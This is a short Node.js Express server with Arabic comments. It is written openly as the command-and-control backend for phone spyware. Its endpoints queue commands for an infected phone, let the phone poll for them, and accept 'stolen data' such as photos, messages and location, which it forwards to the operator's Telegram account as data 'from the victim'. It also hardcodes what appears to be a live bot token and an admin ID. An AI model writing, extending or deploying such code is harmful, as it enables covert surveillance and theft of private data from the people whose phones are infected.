const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

// --- إعداداتك الخاصة ---
const BOT_TOKEN = '8835964839:AAF9khmyZ67FrlEb-i0plU_PjHaRqhzWy8o
'; // استبدل هذا بتوكن بوتك
const ADMIN_ID = '6492180749'; // ضع الآيدي الخاص بك لكي لا يتحكم أحد غيرك بالبوت

// متغير لتخزين الأمر الحالي الموجه للهاتف
let currentCommand = "none";

// 1. نقطة اتصال لبوت التلجرام لاستقبال الأوامر منك
app.get('/set_cmd', async (req, res) => {
    const cmd = req.query.cmd;
    currentCommand = cmd;
    res.send(`تم تحديد الأمر: ${cmd}. الهاتف سينفذه في الدورة القادمة.`);
});

// 2. نقطة اتصال يتصل بها الهاتف كل 30 ثانية لسؤال السيرفر: "ماذا أفعل؟"
app.get('/poll', (req, res) => {
    res.json({ command: currentCommand });
    // بعد أن يأخذ الهاتف الأمر، نعيده إلى "none" حتى لا يكرر التنفيذ
    currentCommand = "none"; 
});

// 3. نقطة اتصال يستعملها الهاتف لإرسال البيانات المسروقة (صور، رسائل، موقع)
app.post('/upload', async (req, res) => {
    const data = req.body.data; 
    const deviceId = req.body.deviceId || "Unknown Device";

    console.log(`بيانات واردة من ${deviceId}: ${data}`);

    // إرسال البيانات المسروقة فوراً إلى حسابك في تلجرام
    const message = `🚨 **بيانات جديدة من الضحية**\n🆔 الجهاز: ${deviceId}\n📄 البيانات:\n${data}`;
    
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: ADMIN_ID,
        text: message,
        parse_mode: 'Markdown'
    });

    res.send("Received");
});

// تشغيل السيرفر
app.listen(3000, () => {
    console.log("Server is running on port 3000...");
});
